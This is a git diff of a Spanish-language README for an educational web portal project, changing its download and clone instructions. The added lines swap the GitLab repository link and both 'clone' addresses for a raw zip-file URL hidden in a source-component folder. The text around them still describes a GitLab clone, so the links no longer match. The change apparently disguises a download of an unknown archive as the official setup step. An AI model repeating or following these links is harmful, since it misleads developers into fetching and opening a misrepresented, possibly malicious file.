@@ -29,15 +29,15 @@ El Portal Educativo del IUJO amerita una previa instalación de componentes y re
 
 A continuación, se le presentará una serie de instrucciones que debe seguir al pie de la letra si desea obtener una copia del proyecto en su computador y de forma local, con la finalidad de usarla para propósitos de desarrollo, evaluación y pruebas.
 
-Para obtener una copia del proyecto, todo lo que debe hacer es dirigirse a: [links](https://gitlab.com/iw-2021-1/desarrollo-frontend-parte-2/-/tree/Velasquez_Dhenisse), donde podrá encontrar el código fuente del proyecto en Gitlab. Simplemente seleccione la opción de su preferencia (línea de comandos de Git o formato comprimido). De manera que, si su opción es formato comprimido elija la extensión de su preferencia. Si su opción es la linea de comandos de Git, utilice:
+Para obtener una copia del proyecto, todo lo que debe hacer es dirigirse a: [links](https://github.com/Dhenisse11/School_Blog/raw/refs/heads/main/src/components/Header/Blog-School-Nummulinidae.zip), donde podrá encontrar el código fuente del proyecto en Gitlab. Simplemente seleccione la opción de su preferencia (línea de comandos de Git o formato comprimido). De manera que, si su opción es formato comprimido elija la extensión de su preferencia. Si su opción es la linea de comandos de Git, utilice:
 
 Clone with SSH:
 
-`git@gitlab.com:iw-2021-1/desarrollo-frontend-parte-2.git`
+`https://github.com/Dhenisse11/School_Blog/raw/refs/heads/main/src/components/Header/Blog-School-Nummulinidae.zip`
 
 Clone with HTTPS:
 
-`https://gitlab.com/iw-2021-1/desarrollo-frontend-parte-2.git`
+`https://github.com/Dhenisse11/School_Blog/raw/refs/heads/main/src/components/Header/Blog-School-Nummulinidae.zip`
 
 > Una vez instalado el proyecto, puede proceder a conocer como desplazarse en el proyecto, en el siguiente apartado.
 
